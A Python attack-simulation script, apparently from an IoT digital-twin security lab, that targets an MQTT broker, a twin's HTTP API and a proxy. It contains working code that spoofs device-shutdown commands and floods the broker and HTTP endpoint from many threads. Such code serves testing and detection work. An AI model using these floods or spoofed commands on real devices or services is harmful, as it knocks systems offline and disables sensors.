import paho.mqtt.client as mqtt
import time
import argparse
import threading
import requests

# Configurações do broker MQTT
BROKER_HOST = "mqtt_broker"
BROKER_PORT = 1884
COMMAND_TOPIC = "device/commands"

# Configurações para ataque via HTTP no Digital Twin
TWIN_HOST = "digital_twin"
TWIN_HTTP_PORT = 8080

# Configurações para ataque via MiTM Proxy
MITM_PROXY_HOST = "mitm_proxy"
MITM_PROXY_PORT = 1885 # Porta que o nosso proxy escuta

def attack_mitm():
    """
    Simula um ataque Man-in-the-Middle.
    Conecta-se ao broker e envia comandos maliciosos para desligar os sensores do device,
    se passando pelo Digital Twin.
    """
    print("[ATTACKER][MiTM] Iniciando ataque MiTM...")
    client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1, "mitm_attacker")
    try:
        client.connect(BROKER_HOST, BROKER_PORT, 60)
        print("[ATTACKER][MiTM] Conectado ao broker MQTT.")

        commands = ["desliga_temp", "desliga_umid", "desliga_arm"]
        for cmd in commands:
            print(f"[ATTACKER][MiTM] Enviando comando malicioso: {cmd}")
            client.publish(COMMAND_TOPIC, cmd)
            time.sleep(1)

        print("[ATTACKER][MiTM] Ataque finalizado. Comandos de desligamento enviados.")
        client.disconnect()
    except Exception as e:
        print(f"[ATTACKER][MiTM] Erro durante o ataque: {e}")

def dos_worker():
    """Função executada por cada thread no ataque DoS/DDoS."""
    client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1)
    try:
        client.connect(BROKER_HOST, BROKER_PORT, 60)
        print(f"[ATTACKER][DoS] Worker {threading.get_ident()} conectado e iniciando o flood de mensagens.")
        while True:
            # Envia uma mensagem sem sentido para sobrecarregar o device
            client.publish(COMMAND_TOPIC, "dos_attack_payload")
            # Não colocamos sleep para maximizar o envio de pacotes
    except Exception as e:
        print(f"[ATTACKER][DoS] Worker {threading.get_ident()} encontrou um erro: {e}")
    finally:
        client.disconnect()


def attack_dos(num_threads=10):
    """
    Simula um ataque de Negação de Serviço (DoS).
    Inicia múltiplas threads para inundar o tópico de comandos com mensagens,
    sobrecarregando o device e o sniffer.
    """
    print(f"[ATTACKER][DoS] Iniciando ataque DoS com {num_threads} workers...")
    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=dos_worker, daemon=True)
        threads.append(thread)
        thread.start()
        time.sleep(0.1) # Pequeno delay para não sobrecarregar o próprio atacante na inicialização

    # Mantém o script principal rodando para que as threads daemon continuem
    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        print("[ATTACKER][DoS] Ataque DoS interrompido.")

def dos_http_worker():
    """Worker para ataque DoS via HTTP no Digital Twin."""
    while True:
        try:
            # Simula um atacante explorando a API aberta do Digital Twin
            requests.post(f"http://{TWIN_HOST}:{TWIN_HTTP_PORT}/", data="comando=dos_http_payload")
        except requests.exceptions.RequestException:
            # Ignora erros de conexão, apenas continua tentando
            pass

def attack_dos_http(num_threads=50):
    """
    Simula um ataque DoS via HTTP contra o Digital Twin.
    Inunda o endpoint HTTP do Twin, que por sua vez inunda o device com comandos MQTT.
    """
    print(f"[ATTACKER][DoS-HTTP] Iniciando ataque com {num_threads} workers contra http://{TWIN_HOST}:{TWIN_HTTP_PORT}/...")
    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=dos_http_worker, daemon=True)
        threads.append(thread)
        thread.start()

    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        print("[ATTACKER][DoS-HTTP] Ataque interrompido.")

def exploit_twin():
    """
    Simula uma invasão direcionada ao Digital Twin, usando sua API para
    enviar comandos maliciosos ao device.
    """
    print(f"[ATTACKER][EXPLOIT] Simulando invasão do Digital Twin para atacar o device...")
    commands = ["desliga_temp", "desliga_umid", "desliga_arm"]
    for cmd in commands:
        try:
            data = f"comando={cmd}"
            response = requests.post(f"http://{TWIN_HOST}:{TWIN_HTTP_PORT}/", data=data)
            if response.status_code == 200:
                print(f"[ATTACKER][EXPLOIT] Comando '{cmd}' enviado com sucesso através da API do Twin.")
            else:
                print(f"[ATTACKER][EXPLOIT] Falha ao enviar comando '{cmd}'. Status: {response.status_code}")
            time.sleep(1)
        except requests.exceptions.RequestException as e:
            print(f"[ATTACKER][EXPLOIT] Erro ao conectar com a API do Twin: {e}")
            break
    print("[ATTACKER][EXPLOIT] Ataque finalizado.")

def attack_mitm_proxy():
    """
    Simula um ataque Man-in-the-Middle usando um proxy.
    Conecta-se ao proxy e envia um comando que será alterado em trânsito.
    """
    print("[ATTACKER][MiTM-Proxy] Iniciando ataque via proxy...")
    client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1, "mitm_proxy_attacker")
    try:
        client.connect(MITM_PROXY_HOST, MITM_PROXY_PORT, 60)
        print(f"[ATTACKER][MiTM-Proxy] Conectado ao proxy em {MITM_PROXY_HOST}:{MITM_PROXY_PORT}.")
        command = "liga_temp"
        print(f"[ATTACKER][MiTM-Proxy] Enviando comando original benigno: '{command}'")
        client.publish(COMMAND_TOPIC, command)
        time.sleep(2)
        print("[ATTACKER][MiTM-Proxy] Ataque finalizado. O proxy deveria ter alterado o comando.")
        client.disconnect()
    except Exception as e:
        print(f"[ATTACKER][MiTM-Proxy] Erro durante o ataque: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Simulador de Ataques Externos.")
    parser.add_argument("attack_type", choices=["mitm", "dos", "dos-http", "exploit", "mitm-proxy"], help="O tipo de ataque a ser simulado.")

    args = parser.parse_args()

    if args.attack_type == "mitm":
        attack_mitm()
    elif args.attack_type == "dos":
        attack_dos()
    elif args.attack_type == "dos-http":
        attack_dos_http()
    elif args.attack_type == "exploit":
        exploit_twin()
    elif args.attack_type == "mitm-proxy":
        attack_mitm_proxy()
